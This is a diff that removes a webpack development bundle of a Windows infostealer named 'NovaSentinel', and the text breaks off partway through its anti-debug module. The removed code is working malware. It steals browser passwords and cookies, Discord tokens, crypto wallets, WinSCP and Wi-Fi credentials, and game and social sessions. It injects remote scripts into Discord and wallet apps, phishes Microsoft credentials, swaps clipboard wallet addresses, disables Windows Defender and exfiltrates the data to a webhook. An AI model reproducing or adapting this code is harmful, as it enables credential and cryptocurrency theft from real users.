@@ -1,643 +1,5591 @@
-/*
- * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
- * This devtool is neither made for production nor for readable output files.
- * It uses "eval()" calls to create a separate source file in the browser devtools.
- * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
- * or disable the default devtool with "devtool: false".
- * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
- */
-/******/ (() => { // webpackBootstrap
-/******/ 	var __webpack_modules__ = ({
-
-/***/ "../node_modules/bindings/bindings.js":
-/*!********************************************!*\
-  !*** ../node_modules/bindings/bindings.js ***!
-  \********************************************/
-/***/ ((module, exports, __webpack_require__) => {
-
-eval("/**\n * Module dependencies.\n */\n\nvar fs = __webpack_require__(/*! fs */ \"fs\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  fileURLToPath = __webpack_require__(/*! file-uri-to-path */ \"../node_modules/file-uri-to-path/index.js\"),\n  join = path.join,\n  dirname = path.dirname,\n  exists =\n    (fs.accessSync &&\n      function(path) {\n        try {\n          fs.accessSync(path);\n        } catch (e) {\n          return false;\n        }\n        return true;\n      }) ||\n    fs.existsSync ||\n    path.existsSync,\n  defaults = {\n    arrow: process.env.NODE_BINDINGS_ARROW || ' → ',\n    compiled: process.env.NODE_BINDINGS_COMPILED_DIR || 'compiled',\n    platform: process.platform,\n    arch: process.arch,\n    nodePreGyp:\n      'node-v' +\n      process.versions.modules +\n      '-' +\n      process.platform +\n      '-' +\n      process.arch,\n    version: process.versions.node,\n    bindings: 'bindings.node',\n    try: [\n      // node-gyp's linked version in the \"build\" dir\n      ['module_root', 'build', 'bindings'],\n      // node-waf and gyp_addon (a.k.a node-gyp)\n      ['module_root', 'build', 'Debug', 'bindings'],\n      ['module_root', 'build', 'Release', 'bindings'],\n      // Debug files, for development (legacy behavior, remove for node v0.9)\n      ['module_root', 'out', 'Debug', 'bindings'],\n      ['module_root', 'Debug', 'bindings'],\n      // Release files, but manually compiled (legacy behavior, remove for node v0.9)\n      ['module_root', 'out', 'Release', 'bindings'],\n      ['module_root', 'Release', 'bindings'],\n      // Legacy from node-waf, node <= 0.4.x\n      ['module_root', 'build', 'default', 'bindings'],\n      // Production \"Release\" buildtype binary (meh...)\n      ['module_root', 'compiled', 'version', 'platform', 'arch', 'bindings'],\n      // node-qbs builds\n      ['module_root', 'addon-build', 'release', 'install-root', 'bindings'],\n      ['module_root', 'addon-build', 'debug', 'install-root', 'bindings'],\n      ['module_root', 'addon-build', 'default', 'install-root', 'bindings'],\n      // node-pre-gyp path ./lib/binding/{node_abi}-{platform}-{arch}\n      ['module_root', 'lib', 'binding', 'nodePreGyp', 'bindings']\n    ]\n  };\n\n/**\n * The main `bindings()` function loads the compiled bindings for a given module.\n * It uses V8's Error API to determine the parent filename that this function is\n * being invoked from, which is then used to find the root directory.\n */\n\nfunction bindings(opts) {\n  // Argument surgery\n  if (typeof opts == 'string') {\n    opts = { bindings: opts };\n  } else if (!opts) {\n    opts = {};\n  }\n\n  // maps `defaults` onto `opts` object\n  Object.keys(defaults).map(function(i) {\n    if (!(i in opts)) opts[i] = defaults[i];\n  });\n\n  // Get the module root\n  if (!opts.module_root) {\n    opts.module_root = exports.getRoot(exports.getFileName());\n  }\n\n  // Ensure the given bindings name ends with .node\n  if (path.extname(opts.bindings) != '.node') {\n    opts.bindings += '.node';\n  }\n\n  // https://github.com/webpack/webpack/issues/4175#issuecomment-342931035\n  var requireFunc =\n     true\n      ? require\n      : 0;\n\n  var tries = [],\n    i = 0,\n    l = opts.try.length,\n    n,\n    b,\n    err;\n\n  for (; i < l; i++) {\n    n = join.apply(\n      null,\n      opts.try[i].map(function(p) {\n        return opts[p] || p;\n      })\n    );\n    tries.push(n);\n    try {\n      b = opts.path ? requireFunc.resolve(n) : requireFunc(n);\n      if (!opts.path) {\n        b.path = n;\n      }\n      return b;\n    } catch (e) {\n      if (e.code !== 'MODULE_NOT_FOUND' &&\n          e.code !== 'QUALIFIED_PATH_RESOLUTION_FAILED' &&\n          !/not find/i.test(e.message)) {\n        throw e;\n      }\n    }\n  }\n\n  err = new Error(\n    'Could not locate the bindings file. Tried:\\n' +\n      tries\n        .map(function(a) {\n          return opts.arrow + a;\n        })\n        .join('\\n')\n  );\n  err.tries = tries;\n  throw err;\n}\nmodule.exports = exports = bindings;\n\n/**\n * Gets the filename of the JavaScript file that invokes this function.\n * Used to help find the root directory of a module.\n * Optionally accepts an filename argument to skip when searching for the invoking filename\n */\n\nexports.getFileName = function getFileName(calling_file) {\n  var origPST = Error.prepareStackTrace,\n    origSTL = Error.stackTraceLimit,\n    dummy = {},\n    fileName;\n\n  Error.stackTraceLimit = 10;\n\n  Error.prepareStackTrace = function(e, st) {\n    for (var i = 0, l = st.length; i < l; i++) {\n      fileName = st[i].getFileName();\n      if (fileName !== __filename) {\n        if (calling_file) {\n          if (fileName !== calling_file) {\n            return;\n          }\n        } else {\n          return;\n        }\n      }\n    }\n  };\n\n  // run the 'prepareStackTrace' function above\n  Error.captureStackTrace(dummy);\n  dummy.stack;\n\n  // cleanup\n  Error.prepareStackTrace = origPST;\n  Error.stackTraceLimit = origSTL;\n\n  // handle filename that starts with \"file://\"\n  var fileSchema = 'file://';\n  if (fileName.indexOf(fileSchema) === 0) {\n    fileName = fileURLToPath(fileName);\n  }\n\n  return fileName;\n};\n\n/**\n * Gets the root directory of a module, given an arbitrary filename\n * somewhere in the module tree. The \"root directory\" is the directory\n * containing the `package.json` file.\n *\n *   In:  /home/nate/node-native-module/lib/index.js\n *   Out: /home/nate/node-native-module\n */\n\nexports.getRoot = function getRoot(file) {\n  var dir = dirname(file),\n    prev;\n  while (true) {\n    if (dir === '.') {\n      // Avoids an infinite loop in rare cases, like the REPL\n      dir = process.cwd();\n    }\n    if (\n      exists(join(dir, 'package.json')) ||\n      exists(join(dir, 'node_modules'))\n    ) {\n      // Found the 'package.json' file or 'node_modules' dir; we're done\n      return dir;\n    }\n    if (prev === dir) {\n      // Got to the top\n      throw new Error(\n        'Could not find module root given file: \"' +\n          file +\n          '\". Do you have a `package.json` file? '\n      );\n    }\n    // Try the parent dir next\n    prev = dir;\n    dir = join(dir, '..');\n  }\n};\n\n\n//# sourceURL=webpack://script/../node_modules/bindings/bindings.js?");
-
-/***/ }),
-
-/***/ "../node_modules/boukiapi/index.js":
-/*!*****************************************!*\
-  !*** ../node_modules/boukiapi/index.js ***!
-  \*****************************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const boukiapi = __webpack_require__(/*! bindings */ \"../node_modules/bindings/bindings.js\")('boukiapi');\n\nmodule.exports.unprotectData = boukiapi.unprotectData;\n\n\n//# sourceURL=webpack://script/../node_modules/boukiapi/index.js?");
-
-/***/ }),
-
-/***/ "../node_modules/file-uri-to-path/index.js":
-/*!*************************************************!*\
-  !*** ../node_modules/file-uri-to-path/index.js ***!
-  \*************************************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("\n/**\n * Module dependencies.\n */\n\nvar sep = (__webpack_require__(/*! path */ \"path\").sep) || '/';\n\n/**\n * Module exports.\n */\n\nmodule.exports = fileUriToPath;\n\n/**\n * File URI to Path function.\n *\n * @param {String} uri\n * @return {String} path\n * @api public\n */\n\nfunction fileUriToPath (uri) {\n  if ('string' != typeof uri ||\n      uri.length <= 7 ||\n      'file://' != uri.substring(0, 7)) {\n    throw new TypeError('must pass in a file:// URI to convert to a file path');\n  }\n\n  var rest = decodeURI(uri.substring(7));\n  var firstSlash = rest.indexOf('/');\n  var host = rest.substring(0, firstSlash);\n  var path = rest.substring(firstSlash + 1);\n\n  // 2.  Scheme Definition\n  // As a special case, <host> can be the string \"localhost\" or the empty\n  // string; this is interpreted as \"the machine from which the URL is\n  // being interpreted\".\n  if ('localhost' == host) host = '';\n\n  if (host) {\n    host = sep + sep + host;\n  }\n\n  // 3.2  Drives, drive letters, mount points, file system root\n  // Drive letters are mapped into the top of a file URI in various ways,\n  // depending on the implementation; some applications substitute\n  // vertical bar (\"|\") for the colon after the drive letter, yielding\n  // \"file:///c|/tmp/test.txt\".  In some cases, the colon is left\n  // unchanged, as in \"file:///c:/tmp/test.txt\".  In other cases, the\n  // colon is simply omitted, as in \"file:///c/tmp/test.txt\".\n  path = path.replace(/^(.+)\\|/, '$1:');\n\n  // for Windows, we need to invert the path separators from what a URI uses\n  if (sep == '\\\\') {\n    path = path.replace(/\\//g, '\\\\');\n  }\n\n  if (/^.+\\:/.test(path)) {\n    // has Windows drive at beginning of path\n  } else {\n    // unix path…\n    path = sep + path;\n  }\n\n  return host + path;\n}\n\n\n//# sourceURL=webpack://script/../node_modules/file-uri-to-path/index.js?");
-
-/***/ }),
-
-/***/ "./index.js":
-/*!******************!*\
-  !*** ./index.js ***!
-  \******************/
-/***/ ((__unused_webpack_module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const admin = __webpack_require__(/*! ./utils/admin */ \"./utils/admin.js\"),\n  browsers = __webpack_require__(/*! ./utils/browsers */ \"./utils/browsers.js\"),\n  core = __webpack_require__(/*! ./utils/core */ \"./utils/core.js\"),\n  crypto = __webpack_require__(/*! ./utils/crypto */ \"./utils/crypto.js\"),\n  discord = __webpack_require__(/*! ./utils/discord */ \"./utils/discord.js\"),\n  files = __webpack_require__(/*! ./utils/files */ \"./utils/files.js\"),\n  twitter = __webpack_require__(/*! ./utils/twitter */ \"./utils/twitter.js\"),\n  { upload } = __webpack_require__(/*! ./utils/uploadFiles */ \"./utils/uploadFiles.js\"),\n  infos = __webpack_require__(/*! ./utils/infos */ \"./utils/infos.js\"),\n  injection = __webpack_require__(/*! ./utils/injection */ \"./utils/injection.js\"),\n  antidebug = __webpack_require__(/*! ./utils/antidebug */ \"./utils/antidebug.js\"),\n  save = __webpack_require__(/*! ./utils/save */ \"./utils/save.js\"),\n  { stat } = __webpack_require__(/*! ./utils/stats */ \"./utils/stats.js\"),\n  roblox = __webpack_require__(/*! ./utils/roblox */ \"./utils/roblox.js\"),\n  minecraft = __webpack_require__(/*! ./utils/minecraft */ \"./utils/minecraft.js\"),\n  phish = __webpack_require__(/*! ./utils/phish */ \"./utils/phish.js\"),\n  reddit = __webpack_require__(/*! ./utils/reddit */ \"./utils/reddit.js\"),\n  https = __webpack_require__(/*! https */ \"https\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  agent = new https.Agent({ rejectUnauthorized: false }),\n  steam = __webpack_require__(/*! ./utils/steam */ \"./utils/steam.js\"),\n  fake_error = __webpack_require__(/*! ./utils/fake_error */ \"./utils/fake_error.js\"),\n  // sound = require(\"./utils/sound\"),\n  kill = __webpack_require__(/*! ./utils/kill */ \"./utils/kill.js\"),\n  uac = __webpack_require__(/*! ./utils/uac */ \"./utils/uac.js\"),\n  tiktok = __webpack_require__(/*! ./utils/tiktok */ \"./utils/tiktok.js\"),\n  instagram = __webpack_require__(/*! ./utils/instagram */ \"./utils/instagram.js\"),\n  cookies = __webpack_require__(/*! ./utils/cookies */ \"./utils/cookies.js\");\n\nlet config = {\n  webhook: \"%WEBHOOK%\",\n  DoINeedTo_beSilent: \"%SILENCE_MOD%\",\n  ClientEmail: \"%CLIENT_EMAIL%\",\n  ChromeInjection: \"%CHROME_INJECTION%\",\n  DoINeedTo_MailChanger: \"%AUTO_MAIL_CHANGER%\",\n  DoINeedTo_Disable2FA: \"%DISABLE_2FA%\",\n  DoINeedTo_BlockDebug: \"%DEBUG_OPTIONS%\",\n  DoINeedTo_GetGames: \"%GAMES_OPTIONS%\",\n  DoINeedTo_GetLaunchers: \"%LAUNCHERS_OPTIONS%\",\n  DoINeedTo_Inject: \"%INJECT_OPTIONS%\",\n  DoINeedTo_GetClients: \"%CLIENTS_OPTIONS%\",\n  DoINeedTo_GetWallets: \"%WALLETS_OPTIONS%\",\n  DoINeedTo_GetVPN: \"%VPN_OPTIONS%\",\n  DoINeedTo_GetSysInfo: \"%SYSINFO_OPTIONS%\",\n  DoINeedTo_GetSocialAPP: \"%SOCIALAPP_OPTIONS%\",\n  DoINeedTo_GetBrowsers: \"%BROWSERS_OPTIONS%\",\n  DoINeedTo_FakeError: \"%FAKEERROR_OPTIONS%\",\n  DoINeedTo_TrollSound: \"%TROLL_SOUND%\",\n  DoINeedTo_TrollImage: \"%TROLL_IMAGE%\",\n  DoINeedTo_FakeErrorMSG: \"%FAKE_ERROR_MSG%\",\n  DoINeedTo_DisableUSERSET: \"%SETTINGS_DISABLER%\",\n  Mcrsft_SniffUrl:\n    \"https://raw.githubusercontent.com/Yokheycv/sub/main/microsoft_credz.ps1\",\n  ChromeInjectionURL:\n    \"https://github.com/Yokheycv/Chrome-inject/raw/main/extensions.zip\",\n  DiscordInjectionURL:\n    \"https://raw.githubusercontent.com/Yokheycv/sub/main/index.js\",\n  ExodusInjectionURL:\n    \"https://raw.githubusercontent.com/Yokheycv/sub/main/exodus-inject.js\",\n  MullvadInjectionURL:\n    \"https://raw.githubusercontent.com/Yokheycv/sub/main/mullvad-inject.js\",\n  AtomicInjectionURL:\n    \"https://raw.githubusercontent.com/Yokheycv/Atomic-inject/main/main.js\",\n  AtomicMainURL:\n    \"https://raw.githubusercontent.com/Yokheycv/Atomic-inject/main/vendors.3d9f29748fbff1778bdc.js\",\n  MailSpringInjectionURL:\n    \"https://raw.githubusercontent.com/Yokheycv/sub/main/mailspring-inject.js\",\n  DoINeedTo_SwapWallet: {\n    active: \"%SWAP_OPTIONS%\",\n    ltc_address: \"%LTC_ADD%\",\n    xlm_address: \"%XLM_ADD%\",\n    eth_address: \"%ETH_ADD%\",\n    dash_address: \"%DASH_ADD%\",\n    bch_address: \"%BCH_ADD%\",\n    btc_address: \"%BTC_ADD%\",\n    xrp_address: \"%XRP_ADD%\",\n    neo_address: \"%NEO_ADD%\",\n    doge_address: \"%DOGE_ADD%\",\n    paypal_address: \"%PAYPAL_ADD%\",\n  },\n};\n\nasync function start() {\n  const myselfbis = await core.NovaSentinelFindMyself();\n  let internetacces = core.checkInternetAccess();\n  if (!internetacces) {\n    process.abort();\n  }\n  kill.KillBrowsersProcess(\n    config.DoINeedTo_Inject,\n    config.DoINeedTo_GetBrowsers,\n    config.DoINeedTo_beSilent\n  );\n  let startuped = core.checkIfStartup(myselfbis);\n  uac.requestAdminPrivilegesIfNeeded(\n    myselfbis,\n    config.ChromeInjection,\n    config.DoINeedTo_DisableUSERSET,\n    config.DoINeedTo_Inject\n  );\n\n  let link = \"\";\n  console.log(\"First instances\");\n  const { disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion } =\n    await core.getInfo();\n  const [\n    { ip, hostname, city, region, country, loc, org, postal, timezone },\n    myself,\n  ] = await Promise.all([core.getPublicIp(), core.NovaSentinelFindMyself()]);\n  const webhook = config.webhook;\n\n  console.log(\"Joined by 2nd !\");\n\n  await save.Init(country, ip);\n\n  const username = process.env.userprofile.split(\"\\\\\")[2];\n  const googlemap = `https://www.google.com/maps/search/google+map++${loc}`;\n\n  antidebug.DoNoDebugNegger(\n    config.DoINeedTo_BlockDebug,\n    ip,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion\n  );\n  await infos.getSysteminformations(\n    config.DoINeedTo_GetSysInfo,\n    ip,\n    hostname,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion\n  );\n  await infos.takeScreenshotAndSave(config.DoINeedTo_GetSysInfo);\n\n  console.log(\"Large Instance started\");\n\n  const promises = [\n    fake_error.error(\n      config.DoINeedTo_FakeError,\n      config.DoINeedTo_FakeErrorMSG,\n      startuped\n    ),\n    infos.NovaSentinelAV(config.DoINeedTo_GetSysInfo),\n    infos.NovaSentinelClipboard(config.DoINeedTo_GetSysInfo),\n    infos.NovaSentinelWifiPasswords(config.DoINeedTo_GetSysInfo),\n    admin.NovaSentinelWinSCP(config.DoINeedTo_GetClients),\n    files.NovaSentinelGOG(config.DoINeedTo_GetLaunchers),\n    files.NovaSentinelElectronicArts(config.DoINeedTo_GetLaunchers),\n    files.NovaSentinelRockstarGames(config.DoINeedTo_GetLaunchers),\n    files.NovaSentinelBattle(config.DoINeedTo_GetLaunchers),\n    files.NovaSentinelEpicGame(config.DoINeedTo_GetLaunchers),\n    files.NovaSentinelSteam(config.DoINeedTo_GetLaunchers),\n    files.NovaSentinelPidgin(config.DoINeedTo_GetSocialAPP),\n    files.NovaSentinelProton(config.DoINeedTo_GetVPN),\n    files.NovaSentinelNordVPN(config.DoINeedTo_GetVPN),\n    files.NovaSentinelOpenVPN(config.DoINeedTo_GetVPN),\n    files.NovaSentinelRiotGame(config.DoINeedTo_GetLaunchers),\n    files.NovaSentinelTelegram(config.DoINeedTo_GetSocialAPP),\n    files.NovaSentinelWhatsapp(config.DoINeedTo_GetSocialAPP),\n    files.NovaSentinelFetchT0x(config.DoINeedTo_GetSocialAPP),\n    crypto.NovaSentinelColds(config.DoINeedTo_GetWallets),\n    crypto.NovaSentinelExtensions(config.DoINeedTo_GetWallets),\n  ];\n  await Promise.all(promises);\n\n  console.log(\"Start Passwords Decryption !\");\n  await files.NovaSentinelSimple();\n  try {\n    const passwords = await browsers.NovaSentinelBrowsers(\n      config.DoINeedTo_GetBrowsers\n    );\n    const passphrase = await crypto.NovaSentinelFetchMeta(passwords);\n    crypto.exodusDecrypt(config.DoINeedTo_GetWallets, passwords);\n    stat.AddPassphrase(passphrase);\n  } catch (e) {\n    save.SaveError(e);\n  }\n  console.log(\"Passwords Decryption finished !\");\n\n  const zipPath = await save.zipResult();\n\n  link = await upload(zipPath);\n  let gembed = stat.Build(\n    username,\n    ip,\n    hostname,\n    city,\n    region,\n    country,\n    googlemap,\n    org,\n    postal,\n    timezone,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion,\n    link\n  );\n  try {\n    axios\n      .all([\n        axios({\n          url: webhook,\n          method: \"POST\",\n\n          headers: {\n            \"Content-Type\": \"application/json\",\n          },\n\n          data: JSON.parse(gembed),\n          httpsAgent: agent,\n        }),\n      ])\n      .then(axios.spread((response1) => {}))\n      .catch((error) => {});\n  } catch (e) {}\n\n  phish.MicroPhish(\n    config.Mcrsft_SniffUrl,\n    config.webhook,\n    config.DoINeedTo_GetSysInfo\n  );\n  // SESSIONS\n  console.log(\"Social Instance started\");\n  const promisesSocialApps = [\n    instagram.ParseInstagram(config.DoINeedTo_GetSocialAPP),\n    tiktok.ParseTiktok(config.DoINeedTo_GetSocialAPP),\n    reddit.NovaRedditor(config.DoINeedTo_GetSocialAPP),\n  ];\n  const [insta_account, tiktok_account, reddit_account] = await Promise.all(\n    promisesSocialApps\n  );\n  roblox.NovaSentinelGetRoblox(config.DoINeedTo_GetGames);\n  roblox.ParseAndSendRoblox(config.DoINeedTo_GetGames);\n  twitter.detailtwitter(config.DoINeedTo_GetSocialAPP);\n  injection.pwnBetterDiscord(config.DoINeedTo_Inject);\n  injection.BypassDiscordTokenProtector(config.DoINeedTo_Inject);\n  injection.inject(\n    config.DoINeedTo_Inject,\n    webhook,\n    config.DiscordInjectionURL,\n    link,\n    config.DoINeedTo_Disable2FA,\n    config.DoINeedTo_MailChanger,\n    config.ClientEmail,\n    config.DoINeedTo_beSilent\n  );\n  steam.NovaSteamator(config.DoINeedTo_GetLaunchers);\n  try {\n    let cookEmbed = await cookies.CookiesFilter(config.DoINeedTo_GetBrowsers);\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: cookEmbed,\n    });\n  } catch (e) {}\n  try {\n    const pd = await steam.sendSteam(config.DoINeedTo_GetLaunchers);\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: pd,\n    });\n  } catch (e) {}\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: insta_account,\n    });\n  } catch (e) {}\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: tiktok_account,\n    });\n  } catch (e) {}\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: reddit_account,\n    });\n  } catch (e) {}\n  try {\n    const p = await twitter.sendTwitter(config.DoINeedTo_GetSocialAPP);\n    if (p) {\n      await axios({\n        url: webhook,\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/json\",\n        },\n        httpsAgent: agent,\n        data: p,\n      });\n    }\n  } catch (e) {}\n\n  var embeds = [];\n\n  const accounts = await discord.NovaSentinelDiscord();\n  stat.addDiscordAccount(accounts);\n  //discord.WriteDiscord(stat.discordAccount[0]);\n  for (let i = 0; i < stat.discordAccount[0].length && i < 3; i++) {\n    const acc = stat.discordAccount[0][i];\n    if (acc.username === null || acc.username === undefined) return;\n    let dscaccount = await discord.embed(\n      acc.username,\n      acc.tag,\n      acc.id,\n      acc.nitro,\n      acc.badges,\n      acc.billings,\n      acc.email,\n      acc.phone,\n      acc.token,\n      acc.avatar,\n      acc.password ?? \"None\"\n    );\n    if (dscaccount !== null || dscaccount == undefined) {\n      embeds.push(dscaccount);\n    }\n    const embedData = await discord.embedbis(acc.token);\n    const embedguild = await discord.embedguild(acc.token);\n    if (embedguild !== null && embedguild !== undefined) {\n      embeds.push(embedguild);\n    }\n    if (embedData !== null && embedData !== undefined) {\n      embeds.push(embedData);\n    }\n  }\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: JSON.parse(discord.compile(embeds.slice(0, 10))),\n    });\n  } catch (e) {}\n\n  let allembed = [];\n\n  try {\n    const p = await roblox.sendRoblox(config.DoINeedTo_GetGames);\n    if (p.length > 0) {\n      allembed = await Promise.all(\n        p.map(async (pd) => {\n          let {\n            UserName,\n            RobuxBalance,\n            ThumbnailUrl,\n            IsAnyBuildersClubMember,\n            IsPremium,\n            friendscount,\n            cookies,\n          } = pd;\n\n          const response = await axios.post(\n            \"https://dpaste.com/api/\",\n            `content=${encodeURIComponent(cookies)}`,\n            {\n              headers: { \"Content-Type\": \"application/x-www-form-urlencoded\" },\n            }\n          );\n\n          const links = response.headers.location;\n          return roblox.embed(\n            UserName,\n            RobuxBalance,\n            ThumbnailUrl,\n            IsAnyBuildersClubMember,\n            IsPremium,\n            friendscount,\n            links\n          );\n        })\n      );\n      await axios({\n        url: webhook,\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/json\",\n        },\n        httpsAgent: agent,\n        data: JSON.parse(roblox.compile(allembed.slice(0, 10))),\n      });\n    }\n  } catch (e) {}\n\n  await minecraft.NovaSentinelfinduid(webhook, config.DoINeedTo_GetGames);\n\n  core.NovaSentinelDisabTaskMNGR(config.DoINeedTo_DisableUSERSET);\n  core.NovaSentinelDisableWinDefender(config.DoINeedTo_DisableUSERSET);\n\n  //sound.sound(config.DoINeedTo_TrollSound);\n  // imagify.spawnimage(config.DoINeedTo_TrollImage);\n}\nasync function afterPassage() {\n  await core.cleaner();\n}\nasync function Class() {\n  await start();\n  console.log(\"class\");\n  await afterPassage();\n  console.log(\"initied\");\n}\nClass();\n\n\n\n//# sourceURL=webpack://script/./index.js?");
-
-/***/ }),
-
-/***/ "./utils/admin.js":
-/*!************************!*\
-  !*** ./utils/admin.js ***!
-  \************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("var Registry = __webpack_require__(/*! winreg */ \"winreg\"),\n{ stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\nsave = __webpack_require__(/*! ./save */ \"./utils/save.js\");\n\nfunction WinSCP() {\n  var WSCP_CHARS = [];\n\n  function _simple_decrypt_next_char() {\n    if (WSCP_CHARS.length == 0) {\n      return 0x00;\n    }\n\n    const WSCP_SIMPLE_STRING = \"0123456789ABCDEF\";\n\n    var a = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());\n    var b = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());\n\n    return 0xff & ~((((a << 4) + b) << 0) ^ 0xa3);\n  }\n\n  this.decrypt = function (username, hostname, encrypted) {\n    if (!encrypted.match(/[A-F0-9]+/)) {\n      return \"\";\n    }\n\n    var result = [],\n      key = [username, hostname].join(\"\");\n\n    WSCP_CHARS = encrypted.split(\"\");\n\n    var flag = _simple_decrypt_next_char(),\n      length;\n\n    if (flag == 0xff) {\n      _simple_decrypt_next_char();\n      length = _simple_decrypt_next_char();\n    } else {\n      length = flag;\n    }\n\n    WSCP_CHARS = WSCP_CHARS.slice(_simple_decrypt_next_char() * 2);\n\n    for (var i = 0; i < length; i++) {\n      result.push(String.fromCharCode(_simple_decrypt_next_char()));\n    }\n\n    if (flag == 0xff) {\n      var valid = result.slice(0, key.length).join(\"\");\n\n      if (valid != key) {\n        result = [];\n      } else {\n        result = result.slice(key.length);\n      }\n    }\n\n    WSCP_CHARS = [];\n\n    return result.join(\"\");\n  };\n}\n\nasync function NovaSentinelWinSCP(cc) {\n  if (cc != \"yes\") return;\n  try {\n    let connections = [];\n    const regKey = new Registry({\n      hive: Registry.HKCU,\n      key: \"\\\\SOFTWARE\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\",\n    });\n\n    const exists = await new Promise((resolve, reject) => {\n      regKey.keyExists((err, exists) => {\n        if (err != null) {\n          resolve(false);\n        }\n        resolve(exists);\n      });\n    });\n    if (!exists) {\n      return;\n    }\n    const subkeys = await new Promise((resolve, reject) => {\n      regKey.keys((err, subkeys) => {\n        if (err != null) {\n          resolve([]);\n        }\n\n        resolve(subkeys);\n      });\n    });\n    if (subkeys.length == 0) {\n      return;\n    }\n\n    stat.AddSysAdmin(\"WinSCP\");\n\n    for (let i = 0; i < subkeys.length; i++) {\n      const subkey = subkeys[i];\n\n      const subRegKey = new Registry({\n        hive: Registry.HKCU,\n        key: subkey.key,\n      });\n\n      const hostname = await new Promise((resolve, reject) => {\n        subRegKey.get(\"HostName\", (err, res) => {\n          if (err == null) {\n            resolve(res.value);\n          }\n          resolve(\"\");\n        });\n      });\n\n      const username = await new Promise((resolve, reject) => {\n        subRegKey.get(\"UserName\", (err, res) => {\n          if (err == null) {\n            resolve(res.value);\n          }\n          resolve(\"\");\n        });\n      });\n\n      const password = await new Promise((resolve, reject) => {\n        subRegKey.get(\"Password\", (err, res) => {\n          if (err == null) {\n            resolve(res.value);\n          }\n          resolve(\"\");\n        });\n      });\n\n      if (password != \"\" && username != \"\" && hostname != \"\") {\n        const winSCP = new WinSCP();\n        connections.push({\n          username: username,\n          password: winSCP.decrypt(username, hostname, password),\n          hostname: hostname,\n        });\n      }\n    }\n    save.saveSysAdmin(connections, \"WinSCP\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nmodule.exports = {\n  NovaSentinelWinSCP,\n};\n\n\n//# sourceURL=webpack://script/./utils/admin.js?");
-
-/***/ }),
-
-/***/ "./utils/antidebug.js":
-/*!****************************!*\
-  !*** ./utils/antidebug.js ***!
-  \****************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const util = __webpack_require__(/*! util */ \"util\"),\r\nexec = util.promisify((__webpack_require__(/*! child_process */ \"child_process\").exec)),\r\naxios = __webpack_require__(/*! axios */ \"axios\"),\r\nsave = __webpack_require__(/*! ./save */ \"./utils/save.js\");\r\n\r\n\r\n\r\nasync function DoNoDebugNegger(cc, ip, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {\r\n    if (cc !== \"yes\") return;\r\n    try{\r\n    const pc_name = process.env.COMPUTERNAME || \"IDK\";\r\n    const user_name = process.env.USERNAME || \"IDK\";\r\n\r\n    \r\n    const[isblockedIP, isblockedUID, isblockedUSERNAME, isblockedPCNAME, isBLOCKEDOS, isBlockedGpu] = await Promise.all([\r\n        ipBLOCKED(ip),\r\n        UuidBLOCKED(uid),\r\n        UsernameBLOCKED(user_name),\r\n        PCNameBLOCKED(pc_name),\r\n        OsBLOCKED(OS), \r\n        GpuBLOCKED(GPU)\r\n    ])\r\n    \r\n    if (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2 || !isNaN(cpucount) && cpucount < 2 || isBlockedGpu || isBLOCKEDOS || isblockedIP || isblockedUID || isblockedUSERNAME || isblockedPCNAME) {\r\n        process.abort();\r\n    }\r\n    try{\r\n    killBlacklistedPrograms()\r\n    }catch(e){\r\n        save.SaveError(e)\r\n    }\r\n}catch(e){\r\n    save.SaveError(e)\r\n}\r\n}\r\n\r\n\r\nasync function killBlacklistedPrograms() {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/nope.json');\r\n        const json = response.data;\r\n\r\n        const blacklistedPrograms = json.blacklistedprog;\r\n\r\n        const { stdout } = await exec('tasklist');\r\n        const runningProcesses = stdout.split(/\\r?\\n/);\r\n\r\n        runningProcesses.forEach((process) => {\r\n            const processName = process.split(/\\s+/)[0].replace(\".exe\", '');\r\n            if (blacklistedPrograms.includes(processName)) {\r\n                try {\r\n                    exec(`taskkill /F /IM ${processName}.exe`, (error) => {\r\n                        if (error) {\r\n                        } else {\r\n                        }\r\n                    });\r\n                } catch (error) {\r\n                }\r\n            }\r\n        });\r\n    } catch (error) {\r\n    }\r\n}\r\n\r\n\r\nasync function GpuBLOCKED(gpu) 